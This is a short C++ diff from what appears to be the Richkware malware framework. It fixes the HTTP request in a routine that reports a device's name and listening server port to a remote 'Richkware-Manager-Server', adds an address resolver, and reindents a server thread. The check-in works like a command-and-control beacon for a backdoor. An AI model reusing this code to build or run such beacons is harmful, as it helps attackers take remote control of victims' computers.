@@ -149,9 +149,34 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
     std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
     //deviceStr = EncryptDecrypt(deviceStr,"5");
 
-    RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/LoadData?data=" +deviceStr +" \r\nHost: " + serverAddress + "\r\nConnection: close\r\n\r\n").c_str());
+    RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/LoadData?data=" +deviceStr +" HTTP/1.1\r\n"
+            "Host: " + serverAddress + "\r\n"+
+            "Connection: keep-alive\r\n"+
+            "\r\n").c_str());
 
     return true;
+}
+
+const char* Network::ResolveAddress(const char *address) {
+    const char* addressIP = "";
+    WSADATA wsaData;
+    struct hostent *remoteHost;
+    char *host_name;
+    struct in_addr addr;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    host_name = (char *) address;
+    remoteHost = gethostbyname(host_name);
+    if (remoteHost != NULL) {
+        if (remoteHost->h_addrtype == AF_INET) {
+            int i = 0;
+            while (remoteHost->h_addr_list[i] != 0) {
+                addr.s_addr = *(u_long *) remoteHost->h_addr_list[i++];
+                addressIP = inet_ntoa(addr);
+                break;
+            }
+        }
+    }
+    return addressIP;
 }
 
 
@@ -228,13 +253,13 @@ void Server::Start(const char* portArg, bool encrypted) {
 void Server::Stop() {
     port = "none";
 
-	closesocket(listenSocket);
-	WSACleanup();
+    closesocket(listenSocket);
+    WSACleanup();
 
-	DWORD dwExit;
-	GetExitCodeThread(hThread, &dwExit);
+    DWORD dwExit;
+    GetExitCodeThread(hThread, &dwExit);
     TerminateThread(hThread, dwExit);
-	//CloseHandle(hThread);
+    //CloseHandle(hThread);
 }
 
 HANDLE Server::getHhread() {
@@ -246,8 +271,8 @@ const char* Server::getPort() {
 }
 
 DWORD WINAPI ServerThread(void* arg) {
-	const char* encryptionKey = (const char*)((*((ServerThreadArgs*)arg)).encryptionKey);
-	SOCKET ListenSocket = (SOCKET)((*((ServerThreadArgs*)arg)).ListenSocket);
+    const char* encryptionKey = (const char*)((*((ServerThreadArgs*)arg)).encryptionKey);
+    SOCKET ListenSocket = (SOCKET)((*((ServerThreadArgs*)arg)).ListenSocket);
 
     //HANDLE hClientThreadArray[1000];
     SOCKET ClientSocket = INVALID_SOCKET;
